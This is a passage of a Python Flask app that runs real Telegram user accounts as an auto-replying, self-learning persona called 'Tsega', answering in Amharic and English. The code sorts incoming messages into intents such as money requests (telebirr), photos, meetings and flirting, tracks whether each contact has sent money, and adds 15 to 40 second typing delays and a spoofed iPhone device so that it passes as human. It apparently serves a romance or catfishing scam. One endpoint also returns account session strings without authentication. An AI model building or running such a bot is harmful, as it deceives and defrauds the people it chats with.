    """Detect user intent from message with enhanced Amharic word detection"""
    if not message:
        return "default"
    
    msg = message.lower().strip()
    
    # Priority 1: Money related
    money_keywords = ['birr', 'ብር', 'money', 'cash', 'ገንዘብ', 'telebirr', 'ቴሌብር', 
                      'send', 'ላክ', '1000', '500', '2000', 'ፈለግ', 'ክፈል', 'payment']
    if any(word in msg for word in money_keywords):
        return "money_request"
    
    # Priority 2: Photo requests
    photo_keywords = ['foto', 'ፎቶ', 'picture', 'photo', 'asay', 'አሳይ', 'litay', 'ልታይ', 
                      'አሳዪ', 'ሥዕል', 'ምስል']
    if any(word in msg for word in photo_keywords):
        return "photo_request"
    
    # Priority 3: Meeting requests
    meet_keywords = ['magenat', 'ማግኘት', 'meet', 'engenagn', 'እንገናኝ', 'litba', 'ልትባ',
                     'እንተያይ', 'ልተዋወቅ', 'መገናኘት', 'ማየት', 'እንተያይ']
    if any(word in msg for word in meet_keywords):
        return "meet"
    
    # Priority 4: Voice call
    call_keywords = ['dimts', 'ድምጽ', 'voice', 'call', 'silk', 'ስልክ', 'dewli', 'ደውሊ',
                     'ደውል', 'ቴሌፎን', 'phone']
    if any(word in msg for word in call_keywords):
        return "voice_call"
    
    # Priority 5: EMS (ፊት) requests
    ems_keywords = ['ems', 'ኢምስ', 'face', 'ፊት', 'fiten', 'ፊቴን', 'face show']
    if any(word in msg for word in ems_keywords):
        return "ems"
    
    # Priority 6: Kula requests
    kula_keywords = ['kula', 'ኩላ', 'kule', 'ኩሌ', 'body', 'አካል']
    if any(word in msg for word in kula_keywords):
        return "kula"
    
    # Priority 7: Tebeji requests
    tebeji_keywords = ['tebeji', 'ተበጂ', 'special', 'ልዩ']
    if any(word in msg for word in tebeji_keywords):
        return "tebeji"
    
    # Priority 8: Compliments
    if 'enibada' in msg or 'እኒባዳ' in msg or 'እኒ ባዳ' in msg:
        return "enibada"
    if 'libdash' in msg or 'ልብዳሽ' in msg or 'ልብ ዳሽ' in msg:
        return "libdash"
    if 'konjo' in msg or 'ቆንጆ' in msg or 'ቆንጆ' in msg:
        return "konjo"
    
    # Priority 9: Greetings
    greetings = ['selam', 'ሰላም', 'hi', 'hello', 'hey', 'ta di yas', 'ታዲያስ', 
                 'dehna deresu', 'ደህና ደረሱ', 'ey', 'እይ', 'ሰላምታ']
    if any(word in msg for word in greetings) and len(msg) < 30:
        return "greeting"
    
    # Priority 10: How are you
    how_are = ['endet neh', 'እንዴት ነህ', 'deh new', 'ደህ ነው', 'how are', 'how r u',
               'እንደምን ነህ', 'እንደምን ነሽ']
    if any(phrase in msg for phrase in how_are):
        return "how_are_you"
    
    # Priority 11: What doing
    doing = ['min tiseraleh', 'ምን ትሰራለህ', 'what doing', 'what are you doing',
             'ምን እየሰራህ', 'እየሰራህ ያለህ']
    if any(phrase in msg for phrase in doing):
        return "what_doing"
    
    # Priority 12: Name
    if 'simih man' in msg or 'ስምህ ማን' in msg or 'your name' in msg or 'ስምሽ ማን' in msg:
        return "ask_name"
    
    # Priority 13: Age
    if 'edmeh sint' in msg or 'እድሜህ ስንት' in msg or 'how old' in msg or 'እድሜሽ ስንት' in msg:
        return "ask_age"
    
    # Priority 14: Location
    location = ['yet nesh', 'የት ነሽ', 'where are you', 'from where', 'የት ነህ', 'ከየት ነህ']
    if any(phrase in msg for phrase in location):
        return "ask_location"
    
    # Priority 15: Job
    job = ['min tiseraleh', 'ምን ትሰራለህ', 'what do you do', 'your job', 'ሥራህ ምንድን']
    if any(phrase in msg for phrase in job):
        return "ask_job"
    
    # Priority 16: Time based
    if 'endemin aderk' in msg or 'good morning' in msg or 'melkam nigt' in msg or 'እንደምን አደርክ' in msg:
        return "morning"
    if 'dehna tenya' in msg or 'good night' in msg or 'ደህና ተኛ' in msg or 'ሌሊት' in msg:
        return "night"
    
    # Priority 17: Emotions
    if 'ewodalehu' in msg or 'እወድሃለሁ' in msg or 'love you' in msg or 'ፍቅር' in msg:
        return "love"
    if 'nafkehalew' in msg or 'ናፍቀሃለው' in msg or 'miss you' in msg or 'ናፍቆት' in msg:
        return "miss"
    if 'amechign' in msg or 'አሜቺግን' in msg or 'jealous' in msg or 'ቅናት' in msg:
        return "jealous"
    
    # Priority 18: Thanks
    if 'amesegnalehu' in msg or 'አመሰግናለሁ' in msg or 'thanks' in msg or 'አመሰግናለሁ' in msg:
        return "thanks"
    
    # Priority 19: Goodbye
    if 'dehna hun' in msg or 'ደህና ሁን' in msg or 'bye' in msg or 'goodbye' in msg or 'ቻው' in msg:
        return "goodbye"
    
    # Priority 20: Family
    family = ['beteseb', 'ቤተሰብ', 'family', 'enate', 'እናቴ', 'abate', 'አባቴ', 'ቤተሰብ']
    if any(word in msg for word in family):
        return "family"
    
    # Priority 21: Bored/Happy/Sad
    if 'aselchi' in msg or 'አሰልቺ' in msg or 'bored' in msg or 'ሰልችቶኛል' in msg:
        return "bored"
    if 'des alegn' in msg or 'ደስ አለኝ' in msg or 'happy' in msg or 'ደስታ' in msg:
        return "happy"
    if 'aznalehu' in msg or 'አዝናለሁ' in msg or 'sad' in msg or 'ሀዘን' in msg:
        return "sad"
    
    # Default
    return "default"

def extract_user_info(message, user_data):
    """Extract user information from messages"""
    msg = message.lower()
    
    name_patterns = [
        r'(?:my name is|i am|i\'m|call me)\s+(\w+)',
        r'^(\w+)$',
        r'ስሜ\s+(\w+)',
        r'እኔ\s+(\w+)',
        r'ስም\s+(\w+)'
    ]
    
    for pattern in name_patterns:
        match = re.search(pattern, msg, re.IGNORECASE)
        if match and len(match.group(1)) > 2:
            name = match.group(1).capitalize()
            if name.lower() not in ['hi', 'hello', 'hey', 'yes', 'no', 'ok']:
                user_data['name'] = name
                break
    
    age_match = re.search(r'(\d+)\s*(?:years old|yrs?|old|አመት|አመቴ)', msg)
    if age_match:
        age = int(age_match.group(1))
        if 15 < age < 100:
            user_data['age'] = age
    
    return user_data

def detect_intent_with_learning(message, history, user_data, learner):
    """Detect intent with context awareness and learning"""
    message_lower = message.lower().strip()
    
    # Check if user is answering a previous question
    if history and len(history) > 1:
        last_bot_msg = None
        for msg in reversed(history):
            if msg.get('role') == 'assistant':
                last_bot_msg = msg.get('text', '')
                break
        
        if last_bot_msg and '?' in last_bot_msg:
            if 'ስም' in last_bot_msg or 'name' in last_bot_msg:
                if user_data.get('name'):
                    return "greeting"  # Already have name
    
    # Priority intents
    money_keywords = ['ቴሌብር', 'telebirr', 'ገንዘብ', 'money', 'ብር', 'birr', 'ላክ', 'send', '1000']
    if any(word in message_lower for word in money_keywords):
        return "money_request"
    
    meet_keywords = ['ማግኘት', 'meet', 'መገናኘት', 'እንገናኝ', 'ማየት']
    if any(word in message_lower for word in meet_keywords):
        return "meet"
    
    call_keywords = ['ድምጽ', 'voice', 'call', 'ስልክ', 'phone', 'ደውል']
    if any(word in message_lower for word in call_keywords):
        return "voice_call"
    
    # Name related
    if any(phrase in message_lower for phrase in ['your name', 'what is your name', 'ስምህ ማን']):
        return "ask_name"
    
    if any(phrase in message_lower for phrase in ['my name is', 'i am', 'i\'m']):
        return "greeting"
    
    # Age related
    if any(phrase in message_lower for phrase in ['your age', 'how old are you', 'ዕድሜህ']):
        return "ask_age"
    
    # Location
    location_words = ['where are you from', 'where do you live', 'የት ነህ', 'ከየት ነህ']
    if any(phrase in message_lower for phrase in location_words):
        return "ask_location"
    
    # Job
    job_words = ['what do you do', 'your job', 'ምን ትሰራለህ', 'ሥራህ']
    if any(phrase in message_lower for phrase in job_words):
        return "ask_job"
    
    # Greetings
    greetings = ['hi', 'hello', 'hey', 'ሰላም', 'ታዲያስ']
    if any(word in message_lower for word in greetings) and len(message_lower) < 20:
        return "greeting"
    
    # How are you
    how_are_you = ['how are you', 'how r u', 'እንደምን ነህ']
    if any(phrase in message_lower for phrase in how_are_you):
        return "how_are_you"
    
    # What doing
    what_doing = ['what are you doing', 'what r u doing', 'ምን ትሰራለህ']
    if any(phrase in message_lower for phrase in what_doing):
        return "what_doing"
    
    # Flirty
    flirty_words = ['beautiful', 'handsome', 'cute', 'sexy', 'ቆንጆ']
    if any(word in message_lower for word in flirty_words):
        return "flirty"
    
    # Thanks
    thanks_words = ['thanks', 'thank you', 'አመሰግናለሁ']
    if any(word in message_lower for word in thanks_words):
        return "thanks"
    
    # Goodbye
    goodbye = ['bye', 'goodbye', 'see you', 'ደህና ሁን']
    if any(word in message_lower for word in goodbye):
        return "goodbye"
    
    # Time based
    if any(word in message_lower for word in ['good morning', 'እንደምን አደርክ']):
        return "morning"
    if any(word in message_lower for word in ['good night', 'ደህና ተኛ']):
        return "night"
    
    # If we've learned this user's preferences
    if user_data.get('user_id'):
        user_prefs = learner.patterns['user_preferences'].get(user_data['user_id'], {})
        if user_prefs:
            # Return most common intent for this user
            return max(user_prefs.items(), key=lambda x: x[1])[0]
    
    return "default"

def generate_evolved_response(message, intent, history, user_data, learner):
    """Generate response using evolved personality"""
    
    # Check if we should use remembered name
    if user_data.get('name') and random.random() < 0.4:
        if 'remember' in message.lower() or 'my name' in message.lower():
            return f"Esh, {user_data['name']} nesh? Awokehu betam 😊"
    
    # Get evolved reply
    response = learner.get_evolved_reply(intent, user_data)
    
    # Personalize with name
    if user_data.get('name'):
        if random.random() < 0.3:
            response = response.replace('ውዴ', f"{user_data['name']} ውዴ")
    
    # Add follow-up question for conversation flow
    traits = learner.evolution['personality_traits']
    if random.random() < traits.get('flirty_level', 0.5):
        if intent not in ["goodbye", "money_request"]:
            follow_ups = ["antess?", "min tishal?", "endet neh?", "deh new?"]
            response += " " + random.choice(follow_ups)
    
    # Add emojis based on learned preferences
    if random.random() < traits.get('flirty_level', 0.6):
        common_emojis = ['😘', '💋', '💕', '🔥']
        if learner.patterns['emoji_usage']:
            # Use emojis that get good responses
            top_emojis = sorted(learner.patterns['emoji_usage'].items(), key=lambda x: x[1], reverse=True)[:3]
            if top_emojis:
                common_emojis = [e[0] for e in top_emojis]
        response += " " + random.choice(common_emojis)
    
    return response

# ==================== AUTO-REPLY HANDLER ====================

async def auto_reply_handler(event, account_id):
    """Handle incoming messages with self-learning personality"""
    try:
        if event.out:
            return
        
        chat = await event.get_chat()
        
        # Only reply to private chats
        if hasattr(chat, 'title') and chat.title:
            return
        if hasattr(chat, 'participants_count') and chat.participants_count > 2:
            return
        
        sender = await event.get_sender()
        if not sender:
            return
        
        user_id = str(sender.id)
        chat_id = str(event.chat_id)
        message_text = event.message.text or ""
        
        if not message_text.strip():
            return
        
        logger.info(f"📨 Message from {user_id}: '{message_text[:50]}...'")
        
        account_key = str(account_id)
        
        # Check if auto-reply is enabled
        if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
            return
        
        chat_settings = reply_settings[account_key].get('chats', {})
        if not chat_settings.get(chat_id, {}).get('enabled', True):
            return
        
        # Initialize learner for this account
        learner = PersonalityLearner(account_id)
        
        # Initialize conversation history
        if account_key not in conversation_history:
            conversation_history[account_key] = {}
        if chat_id not in conversation_history[account_key]:
            conversation_history[account_key][chat_id] = []
        
        # Initialize user context
        if account_key not in user_context:
            user_context[account_key] = {}
        if user_id not in user_context[account_key]:
            user_context[account_key][user_id] = {
                'name': None,
                'age': None,
                'location': None,
                'first_seen': time.time(),
                'last_seen': time.time(),
                'message_count': 0,
                'money_sent': False,
                'preferred_intents': defaultdict(int)
            }
        
        user_data = user_context[account_key][user_id]
        user_data['last_seen'] = time.time()
        user_data['message_count'] += 1
        
        # Store message in history
        conversation_history[account_key][chat_id].append({
            'role': 'user',
            'text': message_text,
            'time': time.time(),
            'user_id': user_id
        })
        
        # Keep last 30 messages for better context
        if len(conversation_history[account_key][chat_id]) > 30:
            conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-30:]
        
        # Extract user info
        user_data = extract_user_info(message_text, user_data)
        
        # Detect intent with learning
        intent = detect_intent_with_learning(
            message_text, 
            conversation_history[account_key][chat_id], 
            user_data,
            learner
        )
        logger.info(f"Detected intent: {intent} for user {user_data.get('name', 'unknown')}")
        
        # Generate evolved response
        response = generate_evolved_response(
            message_text,
            intent,
            conversation_history[account_key][chat_id],
            user_data,
            learner
        )
        
        if not response:
            response = learner.get_evolved_reply('default')
        
        # Human-like delay (15-40 seconds)
        delay = random.randint(15, 40)
        logger.info(f"⏱️ Waiting {delay}s before replying...")
        
        # Show typing indicator
        async with event.client.action(event.chat_id, 'typing'):
            await asyncio.sleep(delay)
        
        # Send reply
        await event.reply(response)
        logger.info(f"✅ Replied: '{response[:50]}...'")
        
        # Store reply in history
        conversation_history[account_key][chat_id].append({
            'role': 'assistant',
            'text': response,
            'time': time.time()
        })
        
        # LEARN from this exchange
        learner.learn_from_exchange(
            message_text,
            response,
            user_id,
            intent,
            success=True
        )
        
        # Update user's preferred intents
        user_data['preferred_intents'][intent] += 1
        
        # Save all data
        save_conversation_history()
        save_user_context()
        save_learning_data()
        
    except Exception as e:
        logger.error(f"Error in auto-reply: {e}")
        try:
            # Fallback reply
            learner = PersonalityLearner(account_id)
            await event.reply(learner.get_evolved_reply('default'))
        except:
            pass

# ==================== CLIENT MANAGEMENT ====================

async def start_auto_reply_for_account(account):
    """Start auto-reply listener with self-learning"""
    account_id = account['id']
    account_key = str(account_id)
    reconnect_count = 0
    
    while True:
        try:
            logger.info(f"Starting auto-reply for account {account_id} (attempt {reconnect_count + 1})")
            
            client = TelegramClient(
                StringSession(account['session']), 
                API_ID, 
                API_HASH,
                connection_retries=10,
                retry_delay=5,
                timeout=60,
                device_model="iPhone 13",
                system_version="15.0",
                app_version="8.4.1"
            )
            
            await client.connect()
            
            if not await client.is_user_authorized():
                logger.error(f"Account {account_id} not authorized")
                await asyncio.sleep(30)
                reconnect_count += 1
                continue
            
            active_clients[account_key] = client
            active_listeners[account_key] = True
            
            @client.on(events.NewMessage(incoming=True))
            async def handler(event):
                await auto_reply_handler(event, account_id)
            
            await client.start()
            logger.info(f"✅ Self-learning Tsega ACTIVE for {account.get('name')}")
            
            reconnect_count = 0
            await client.run_until_disconnected()
            
        except Exception as e:
            logger.error(f"Connection lost for account {account_id}: {e}")
            if account_key in active_clients:
                del active_clients[account_key]
            
            reconnect_count += 1
            wait_time = min(30 * reconnect_count, 300)
            logger.info(f"Reconnecting in {wait_time}s...")
            await asyncio.sleep(wait_time)

def stop_auto_reply_for_account(account_id):
    """Stop auto-reply for a specific account"""
    account_key = str(account_id)
    if account_key in active_listeners:
        active_listeners[account_key] = False
    
    if account_key in active_clients:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(active_clients[account_key].disconnect())
            loop.close()
            del active_clients[account_key]
            logger.info(f"Stopped auto-reply for account {account_key}")
            return True
        except Exception as e:
            logger.error(f"Error stopping auto-reply: {e}")
    return False

def start_all_auto_replies():
    """Start auto-reply for all enabled accounts"""
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            if account_key not in active_clients:
                # SIMPLE FIX - use a simple lambda with account copy
                thread = threading.Thread(
                    target=lambda a=account: run_async(lambda: start_auto_reply_for_account(a)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
                time.sleep(2)

# ==================== API ENDPOINTS ====================

@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login_page():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/settings')
def settings_page():
    return send_file('settings.html')

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    return jsonify({
        'success': True,
        'accounts': accounts
    })

@app.route('/api/add-account', methods=['POST'])
def add_account():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    try:
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Sending code to {phone}")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(), API_ID, API_HASH, connection_retries=3, timeout=30)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_connected()):
            raise Exception("Failed to connect to Telegram")
        
        result = loop.run_until_complete(client.send_code_request(phone))
        
        logger.info(f"Code sent to {phone}")
        
        session_id = hashlib.md5(f"{phone}_{time.time()}".encode()).hexdigest()
        temp_sessions[session_id] = {
            'client': client,
            'phone': phone,
            'phone_code_hash': result.phone_code_hash,
            'created': time.time(),
            'loop': loop
        }
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'message': 'Code sent successfully'
        })
        
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        if 'client' in locals():
            try:
                loop.run_until_complete(client.disconnect())
            except:
                pass
        if 'loop' in locals():
            loop.close()
        
        error_msg = str(e)
        if "PHONE_NUMBER_INVALID" in error_msg:
            return jsonify({'success': False, 'error': 'Invalid phone number format'})
        elif "FLOOD_WAIT" in error_msg:
            match = re.search(r'FLOOD_WAIT_(\d+)', error_msg)
            if match:
                return jsonify({'success': False, 'error': f'Too many attempts. Wait {match.group(1)} seconds'})
            return jsonify({'success': False, 'error': 'Too many attempts. Please try later'})
        else:
            return jsonify({'success': False, 'error': f'Failed: {error_msg}'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Code and session ID required'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    client = session_data['client']
    phone = session_data['phone']
    phone_code_hash = session_data['phone_code_hash']
    loop = session_data.get('loop')
    
    if loop:
        asyncio.set_event_loop(loop)
    else:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    try:
        user = loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=phone_code_hash))
        
        me = loop.run_until_complete(client.get_me())
        string_session = client.session.save()
        
        account = {
            'id': me.id,
            'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or f"User {me.id}",
            'phone': phone,
            'session': string_session,
            'added': time.time()
        }
        
        accounts.append(account)
        save_accounts()
        
        reply_settings[str(me.id)] = {
            'enabled': False,
            'chats': {}
        }
        save_reply_settings()
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        del temp_sessions[session_id]
        
        return jsonify({'success': True, 'account': account})
        
    except SessionPasswordNeededError:
        if password:
            try:
                loop.run_until_complete(client.sign_in(password=password))
                
                me = loop.run_until_complete(client.get_me())
                string_session = client.session.save()
                
                account = {
                    'id': me.id,
                    'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or f"User {me.id}",
                    'phone': phone,
                    'session': string_session,
                    'added': time.time()
                }
                
                accounts.append(account)
                save_accounts()
                
                reply_settings[str(me.id)] = {
                    'enabled': False,
                    'chats': {}
                }
                save_reply_settings()
                
                loop.run_until_complete(client.disconnect())
                loop.close()
                del temp_sessions[session_id]
                
                return jsonify({'success': True, 'account': account})
                
            except Exception as e:
                return jsonify({'success': False, 'error': str(e)})
        else:
            return jsonify({'success': False, 'need_password': True})
            
    except PhoneCodeInvalidError:
        return jsonify({'success': False, 'error': 'Invalid code'})
    except PhoneCodeExpiredError:
        return jsonify({'success': False, 'error': 'Code expired'})
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/reply-settings', methods=['GET'])
def get_reply_settings():
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    settings = reply_settings.get(str(account_id), {
        'enabled': False,
        'chats': {}
    })
    
    return jsonify({
        'success': True,
        'settings': settings
    })

@app.route('/api/reply-settings', methods=['POST'])
def update_reply_settings():
    data = request.json
    account_id = data.get('accountId')
    enabled = data.get('enabled', False)
    chats = data.get('chats', {})
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    
    reply_settings[account_key] = {
        'enabled': enabled,
        'chats': chats
    }
    save_reply_settings()
    
    if enabled:
        if account_key not in active_clients:
            account = next((a for a in accounts if str(a['id']) == account_key), None)
            if account:
                # SIMPLE FIX - use a simple lambda with account copy
                thread = threading.Thread(
                    target=lambda a=account: run_async(lambda: start_auto_reply_for_account(a)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
    else:
        stop_auto_reply_for_account(account_id)
    
    return jsonify({'success': True})

@app.route('/api/toggle-chat-reply', methods=['POST'])
def toggle_chat_reply():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    enabled = data.get('enabled', True)
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    if account_key not in reply_settings:
        reply_settings[account_key] = {
            'enabled': False,
            'chats': {}
        }
    
    if 'chats' not in reply_settings[account_key]:
        reply_settings[account_key]['chats'] = {}
    
    if chat_id not in reply_settings[account_key]['chats']:
        reply_settings[account_key]['chats'][chat_id] = {}
    
    reply_settings[account_key]['chats'][chat_id]['enabled'] = enabled
    save_reply_settings()
    
    return jsonify({'success': True})

@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        dialogs = loop.run_until_complete(client.get_dialogs())
        
        chats = []
        for dialog in dialogs:
            if dialog.is_user and not dialog.entity.bot:
                chat = {
                    'id': str(dialog.id),
                    'title': dialog.name or f"User {dialog.id}",
                    'type': 'user',
                    'lastMessage': dialog.message.text[:50] if dialog.message and dialog.message.text else 'No messages'
                }
                chats.append(chat)
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({
            'success': True,
            'chats': chats
        })
        
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        auths = loop.run_until_complete(client(GetAuthorizationsRequest()))
        
        sessions = []
        for auth in auths.authorizations:
            session = {
                'hash': auth.hash,
                'device_model': auth.device_model,
                'platform': auth.platform,
                'system_version': auth.system_version,
                'api_id': auth.api_id,
                'app_name': auth.app_name,
                'app_version': auth.app_version,
                'date_created': auth.date_created,
                'date_active': auth.date_active,
                'ip': auth.ip,
                'country': auth.country,
                'region': auth.region,
                'current': auth.current
            }
            sessions.append(session)
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        current_hash = None
        for s in sessions:
            if s['current']:
                current_hash = s['hash']
                break
        
        return jsonify({
            'success': True,
            'sessions': sessions,
            'current_hash': current_hash
        })
        
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    data = request.json
    account_id = data.get('accountId')
    hash_value = data.get('hash')
    
    if not account_id or not hash_value:
        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        loop.run_until_complete(client(ResetAuthorizationRequest(hash_value)))
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({'success': True, 'message': 'Session terminated'})
        
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_all_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        auths = loop.run_until_complete(client(GetAuthorizationsRequest()))
        
        for auth in auths.authorizations:
            if not auth.current:
                try:
                    loop.run_until_complete(client(ResetAuthorizationRequest(auth.hash)))
                except:
                    pass
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({'success': True, 'message': 'All other sessions terminated'})
        
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/conversation-history', methods=['GET'])
def get_conversation_history():
    account_id = request.args.get('accountId')
    chat_id = request.args.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    history = []
    if account_key in conversation_history and chat_id in conversation_history[account_key]:
        history = conversation_history[account_key][chat_id]
    
    return jsonify({
        'success': True,
        'history': history
    })

@app.route('/api/clear-history', methods=['POST'])
def clear_history():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    if account_key in conversation_history and chat_id in conversation_history[account_key]:
        conversation_history[account_key][chat_id] = []
        save_conversation_history()
    
    return jsonify({'success': True})

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'active_clients': len(active_clients),
        'timestamp': time.time()
    })

@app.route('/api/test-telegram', methods=['GET'])
def test_telegram_connection():
    """Test Telegram API connection"""
    results = {
        'api_id': API_ID,
        'api_id_valid': False,
        'connection': False,
        'errors': []
    }
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(), API_ID, API_HASH, timeout=10)
        connected = loop.run_until_complete(client.connect())
        
        if connected:
            results['connection'] = True
            results['api_id_valid'] = True
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({
            'success': True,
            'results': results
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e),
            'results': results
        })

@app.route('/api/learning-stats', methods=['GET'])
def get_learning_stats():
    """Get learning statistics for an account"""
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    if account_key not in learning_data:
        return jsonify({'success': False, 'error': 'No learning data found'})
    
    data = learning_data[account_key]
    evolution = data['evolution']
    
    # Convert set to list for JSON
    unique_users_count = len(evolution['unique_users'])
    
    # Get top learned phrases
    top_phrases = sorted(data['patterns']['phrase_freq'].items(), key=lambda x: x[1], reverse=True)[:10]
    
    return jsonify({
        'success': True,
        'stats': {
            'total_messages': evolution['total_messages'],
            'unique_users': unique_users_count,
            'learning_iterations': evolution['learning_iterations'],
            'personality_traits': evolution['personality_traits'],
            'top_phrases': top_phrases,
            'replies_count': {k: len(v) for k, v in data['replies'].items() if k in ['greeting', 'flirty', 'money_request', 'meet', 'default']}
        }
    })

@app.route('/api/evolve-now', methods=['POST'])
def force_evolution():
    """Force personality evolution for an account"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    learner = PersonalityLearner(account_id)
    learner.evolve_personality()
    
    return jsonify({'success': True, 'message': 'Personality evolved'})

@app.route('/api/reset-learning', methods=['POST'])
def reset_learning():
    """Reset learning for an account"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    if account_key in learning_data:
        del learning_data[account_key]
        save_learning_data()
    
    return jsonify({'success': True, 'message': 'Learning data reset'})

# ==================== KEEP ALIVE ====================

def keep_alive():
    """Keep Render from sleeping"""
    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:5000')
    
    while True:
        try:
            requests.get(f"{app_url}/api/health", timeout=10)
            
            # Ping Telegram to keep connections alive
            for account_key, client in list(active_clients.items()):
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    if client and hasattr(client, 'get_me'):
                        coro = client.get_me()
                        if asyncio.iscoroutine(coro):
                            loop.run_until_complete(coro)
                    loop.close()
                    logger.info(f"✅ Connection alive for account {account_key}")
                except Exception as e:
                    logger.warning(f"⚠️ Connection dead for account {account_key}: {e}")
            
            logger.info(f"🔋 Keep-alive ping sent")
        except Exception as e:
            logger.error(f"Keep-alive error: {e}")
        
        time.sleep(240)

# ==================== STARTUP ====================

def start_auto_reply_thread():
    """Start auto-reply in background"""
    time.sleep(5)
    logger.info("Starting self-learning Tsega for enabled accounts...")
